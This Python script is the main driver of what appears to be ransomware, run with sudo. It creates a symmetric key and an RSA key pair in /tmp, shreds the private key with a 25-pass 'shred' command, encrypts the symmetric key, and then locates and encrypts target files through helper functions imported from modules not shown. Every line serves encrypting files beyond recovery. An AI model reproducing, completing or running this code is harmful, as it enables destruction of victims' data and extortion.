#!/usr/bin/sudo python3

import sys
import os
import subprocess as sp

from utils import create_symmetric_key, create_asymmetric_key, encrypt_symmetric_key,  encrypt_target_files
from config import starter_text, Color

def encrypt():
	try:
		print(starter_text, end="\n\n")

		# Symmetric key stuff
		symmetric_key , symmetric_key_path = create_symmetric_key()
		print(Color.WHITE + f'[*] Key Created Successfully: {symmetric_key}')
		print(Color.WHITE + '[*] Key stored in ' + symmetric_key_path)
		# Asymmetric key stuff
		create_asymmetric_key()
		print(Color.WHITE + '[*] RSA Keys Created Successfully In /tmp Directory')
		print(Color.WHITE + '[*] Shredding Private Key ...')
		os.chdir('/tmp')
		sp.call(['shred', '-zvun', '25', 'privatekey.key'])
		print(Color.WHITE + '[*] Key Deleted Successfully')
		# Encrypt symmetric key
		encrypt_symmetric_key()
		print('[*] Symmetric Key Encrypted !')
		# Encrypt files
		print('\n[*] Locating Target Files')
		print('[*] Beginning Crypto Operations')
		encrypt_target_files(symmetric_key)

	except KeyboardInterrupt:
		print(Color.RED + '[-]Ctrl +C pressed!!Exiting....')
		sys.exit()

if __name__ == "__main__":
	os.system('clear')
	encrypt()
	print(Color.RED + '[*] File Encryption Done!')